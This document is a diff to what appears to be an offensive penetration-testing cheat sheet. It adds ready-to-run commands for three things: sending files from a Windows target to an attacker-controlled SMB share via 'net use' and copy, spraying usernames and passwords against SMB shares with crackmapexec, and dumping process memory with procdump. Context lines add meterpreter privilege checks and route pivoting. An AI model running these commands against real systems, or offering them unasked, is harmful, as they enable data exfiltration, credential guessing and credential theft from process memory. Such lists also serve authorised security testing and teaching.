@@ -88,6 +88,17 @@ done && cat) <&3
 exec 3>&-
 }
 ```
+### send data via SMB Server (windows)
+reciever:
+```bash
+python smbserver.py -smb2support -username guest -password guest share [TargetPath]
+```
+sender:
+```powershell
+net use x: \\[RecieverIP]\share /user:guest guest
+cmd /c "copy [FileName] X:\"
+```
+
 
 ### send data via Base64 Encoding
 on attacker: `base64 -w 0 [FileName]`
@@ -193,6 +204,11 @@ tasklist
 netstat -an
 ```
 
+## CRACKMAPEXEC CME
+```bash
+crackmapexec smb -u [UsernameFile or Username] -p [PasswordFile or Password] --shares
+```
+
 ## POST EXPLOITATION WINDOWS
 ```powershell
 Get-WmiObject -Class win32_OperatingSystem (Power Shell)
@@ -205,6 +221,13 @@ getuid
 sysinfo
 getprivs
 run autoroute -s [SUBNET IP] -n 255.255.255.0
+```
+
+## DUMP PROCESSES WINDOWS
+```powershell
+get-process
+get-process -name [ProcessName]
+.\procdump.exe -ma [ProcessID] [OutputFileName]
 ```
 
 ## LIST SUDO COMMANDS
